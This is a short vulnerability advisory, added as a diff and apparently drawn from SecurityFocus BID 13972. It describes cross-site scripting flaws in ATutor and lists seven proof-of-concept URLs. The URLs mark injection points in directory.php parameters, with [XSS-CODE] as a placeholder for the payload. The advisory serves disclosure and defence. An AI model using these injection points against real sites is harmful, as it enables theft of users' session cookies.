@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/13972/info
+        
+ATutor is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+        
+An attacker may leverage any of these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks. 
+
+http://www.example.com/ATutor/directory.php?roles%5B%5D=[XSS-CODE]1&roles%5B%5D=2&roles%5B%5D=3&status=1&submit=Filter
+http://www.example.com/ATutor/directory.php?roles%5B%5D=1&roles%5B%5D=[XSS-CODE]2&roles%5B%5D=3&status=1&submit=Filter
+http://www.example.com/ATutor/directory.php?roles%5B%5D=1&roles%5B%5D=2&roles%5B%5D=3[XSS-CODE]&status=1&submit=Filter
+http://www.example.com/ATutor/directory.php?roles%5B%5D=1&roles%5B%5D=2&roles%5B%5D=3&status=1[XSS-CODE]&submit=Filter
+http://www.example.com/ATutor/directory.php?roles%5B%5D=1&roles%5B%5D=2&roles%5B%5D=3&status=1&submit=Filter[XSS-CODE]
+http://www.example.com/ATutor/directory.php?roles%5B%5D=1&status=2&reset_filter=Reset+Filter[XSS-CODE]
+http://www.example.com/ATutor/directory.php?roles[]=1[XSS-CODE] 
